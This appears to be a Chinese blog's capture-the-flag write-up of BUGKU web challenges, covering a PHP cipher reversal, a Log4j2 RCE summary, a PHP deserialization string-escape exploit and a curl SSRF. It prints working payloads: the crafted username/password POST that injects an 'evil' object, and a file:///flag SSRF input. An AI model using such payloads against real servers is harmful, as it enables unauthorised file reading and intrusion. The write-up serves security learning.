<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line">    <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>((<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) + <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) % <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我感觉这道题并不是web 的题目，但是不知道为啥放在web里面，所以我就直接上脚本了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="string">&#x27;ISCC&#x27;</span>);</span><br><span class="line"><span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$base64_str</span> = <span class="string">&#x27;fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=&#x27;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$base64_str</span>);</span><br><span class="line"><span class="variable">$len</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$char</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$klen</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$x</span> == <span class="variable">$klen</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$x</span> = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$char</span> .= <span class="variable">$key</span>[<span class="variable">$x</span>];</span><br><span class="line">    <span class="variable">$x</span>+=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) &gt; <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>])) &#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]) - <span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> .= <span class="title function_ invoke__">chr</span> (<span class="number">128</span>+<span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>])-<span class="title function_ invoke__">ord</span>(<span class="variable">$char</span>[<span class="variable">$i</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$str</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241129203825376.png" alt="image-20241129203825376"></p>
<h1 id="Apache-Log4j2-RCE"><a href="#Apache-Log4j2-RCE" class="headerlink" title="Apache Log4j2 RCE"></a>Apache Log4j2 RCE</h1><p>是一个远程代码执行漏洞</p>
<h2 id="Apache-log4j介绍"><a href="#Apache-log4j介绍" class="headerlink" title="Apache log4j介绍"></a>Apache log4j介绍</h2><p>　　Apache log4j是Apache的一个开源项目，Apache log4j 2是一个就Java的日志记录工具。该工具重写了log4j框架，并且引入了大量丰富的特性。我们可以控制日志信息输送的目的地为控制台、文件、GUI组建等，通过定义每一条日志信息的级别，能够更加细致地控制日志的生成过程。log4j2中存在JNDI注入漏洞，当程序记录用户输入的数据时，即可触发该漏洞。成功利用该漏洞可在目标服务器上执行任意代码。</p>
<h1 id="newphp"><a href="#newphp" class="headerlink" title="newphp"></a>newphp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php版本:5.4.44</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$hint</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;hint = <span class="variable">$hint</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;hint===<span class="string">&quot;hint.php&quot;</span>)</span><br><span class="line">            @<span class="variable language_">$this</span>-&gt;hint = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;hint)); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$this</span>-&gt;hint);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;hint != <span class="string">&quot;╭(●｀∀´●)╯&quot;</span>) &#123; </span><br><span class="line">            <span class="comment">//There&#x27;s a hint in ./hint.php</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;hint = <span class="string">&quot;╰(●’◡’●)╮&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$tmp</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$username</span>, <span class="variable">$password</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag/is&#x27;</span>,<span class="variable">$a</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;NoNoNo!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="variable">$a</span>)));</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>字符串逃逸</p>
<p>原理可以自行百度哈</p>
<p>因为我们在evil类中可以看到有file_get_contents()函数去读取hint.php的值，但是题目中并没有对evil类进行一个反序列化，所以我们需要利用User类的反序列化操作去反序列化这个evil类，这样才能触发__destruct()魔术方法去访问hint.php</p>
<p>在这里，我们可以利用字符串增多和字符串减少进行字符串逃逸，但是首先我们都要理解到我们需要逃逸的字符串是什么</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;hint&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;hint.php&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这个就是我们需要逃逸的字符串，然后我们就需要考虑是通过字符增多还是通过字符减少</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="variable">$tmp</span> = <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$tmp</span>;</span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>).<span class="string">&#x27;*&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="variable">$a</span>)));</span><br></pre></td></tr></table></figure>

<p>在这里可以看到，如果我们选择字符增多的话，我们就会用*去做替换，但是因为最后的反序列化的步骤，*在write()方法做替换之后会在read()方法中重新替换回去，所以这没什么作用，那我们只能考虑字符减少，字符减少的话write()方法里面的替换就没什么干扰了</p>
<p>如果我们传入一个\0\0\0，经过这两个函数作用后，\0\0\0就会被替换成*，字符减少。那么我们可以对username传入若干组\0\0\0来将O:4:”evil”:1:{s:4:”hint”;s:8:”hint.php”;}逃逸出去。当然，逃逸的关键就是闭合和字符个数</p>
<p>我们正常的序列化字符串是这样的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:1:&quot;1&quot;;s:8:&quot;password&quot;;s:1:&quot;2&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>因为需要字符减少进行字符串逃逸，所以我们的真实的序列化的字符串应该是这样的</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">44</span>:<span class="string">&quot;1&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;evil&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;hint&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;hint.php&quot;</span>;&#125;<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p>“;s:8:”password”;s:44:”1就是我们需要吃掉的字符串，这里的字符串长度是24个，那\0\0\0可以替换一个chr(0).’*’.chr(0)，所以会减少三个字符，那么我们如果要减少24个字符，就需要8对\0\0\0，数学不差的话还是可以算出来的哈</p>
<p>所以我们的payload就是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>\<span class="number">0</span>&amp;password=<span class="number">1</span><span class="string">&quot;;O:4:&quot;</span>evil<span class="string">&quot;:2:&#123;s:4:&quot;</span>hint<span class="string">&quot;;s:8:&quot;</span>hint.php<span class="string">&quot;;&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/./../image/achieve/202411/BUGKU/image-20241130004755731.png" alt="image-20241130004755731"></p>
<p>得到一个编码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$hint</span> = <span class="string">&quot;index.cgi&quot;</span>;</span><br><span class="line"> <span class="comment">// You can&#x27;t see me~</span></span><br></pre></td></tr></table></figure>

<p>访问一下</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241130004929742.png" alt="image-20241130004929742"></p>
<p>不知道是不是有ssrf，UA头里出现了curl函数 我们知道curl函数是可以扒取前端页面的.</p>
<p><code>User-Agent</code> 头部的取值为 <code>&quot;curl/7.64.0&quot;</code>，这表明发送该请求的客户端是使用 Curl 应用程序版本 7.64.0。Curl 是一个非常流行的命令行工具和库，用于在命令行下进行 URL 传输。通过 Curl，用户可以发送各种类型的网络请求，包括 HTTP 请求、FTP 请求等，从而方便地与 Web 服务器进行通信和数据交换。</p>
<p>我们测试一下</p>
<p>?name&#x3D;1</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241201222057191.png" alt="image-20241201222057191"></p>
<p>那就用伪协议file去读文件</p>
<p>?name&#x3D;%20file:&#x2F;&#x2F;&#x2F;flag（file前要加空格）猜测服务端的curl函数进行执行时 是直接拼接我们的输入的值,例如  curlfile  这样执行不了    curl file 这样才可以执行ssrf</p>
<h1 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h1><p><img src="/./../image/achieve/202411/BUGKU/image-20241202102642472.png" alt="image-20241202102642472"></p>
<p>点击注册后</p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241202102759797.png" alt="image-20241202102759797"></p>
<p>源码也没什么信息，扫目录扫到了一个<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a></p>
<p><img src="/./../image/achieve/202411/BUGKU/image-20241202102910816.png" alt="image-20241202102910816"></p>
<p>把文件下载下来(直接url后加上<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a>)</p>
<p>把文件的内容看了一遍，然后发现了一个index.js文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="keyword">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">setFn</span> = <span class="keyword">require</span>(<span class="string">&#x27;set-value&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title function_ invoke__">Router</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">Admin</span> = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:process.env.password?process.env.password:<span class="string">&quot;password&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_ invoke__">post</span>(<span class="string">&quot;/getflag&quot;</span>, function (req, res, next) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.password === undefined || req.body.password === req.session.challenger.password)&#123;</span><br><span class="line">        res.<span class="title function_ invoke__">send</span>(<span class="string">&quot;登录失败&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.session.challenger.age &gt; <span class="number">79</span>)&#123;</span><br><span class="line">            res.<span class="title function_ invoke__">send</span>(<span class="string">&quot;糟老头子坏滴很&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        let key = req.body.key.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">        let password = req.body.password.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.<span class="title function_ invoke__">send</span>(process.env.flag ? process.env.flag : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_ invoke__">send</span>(<span class="string">&quot;密码错误，请使用管理员用户名登录.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/reg&#x27;</span>, function (req, res, next) &#123;</span><br><span class="line">    req.session.challenger = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;pass&quot;</span>,</span><br><span class="line">        <span class="string">&quot;age&quot;</span>: <span class="number">80</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_ invoke__">send</span>(<span class="string">&quot;用户创建成功!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/&#x27;</span>, function (req, res, next) &#123;</span><br><span class="line">    res.<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;index&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;/index&#x27;</span>, function (req, res, next) &#123;</span><br><span class="line">    res.<span class="title function_ invoke__">send</span>(<span class="string">&#x27;&lt;title&gt;BUGKU-登录&lt;/title&gt;&lt;h1&gt;前端被炒了&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;./reg&quot;&gt;注册&lt;/a&gt;&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_ invoke__">post</span>(<span class="string">&quot;/update&quot;</span>, function (req, res, next) &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.session.challenger === undefined)&#123;</span><br><span class="line">        res.<span class="title function_ invoke__">redirect</span>(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.attrkey === undefined || req.body.attrval === undefined) &#123;</span><br><span class="line">            res.<span class="title function_ invoke__">send</span>(<span class="string">&quot;传参有误&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            let key = req.body.attrkey.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">            let value = req.body.attrval.<span class="title function_ invoke__">toString</span>();</span><br><span class="line">            <span class="title function_ invoke__">setFn</span>(req.session.challenger, key, value);</span><br><span class="line">            res.<span class="title function_ invoke__">send</span>(<span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">module.exports = router;</span><br></pre></td></tr></table></figure>


    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2024/11/25/BUGKU-web/" title="BUGKU--web">https://wanth3f1ag.top/2024/11/25/BUGKU-web/</a>
  </li>
  <li class="post-copyright-license">
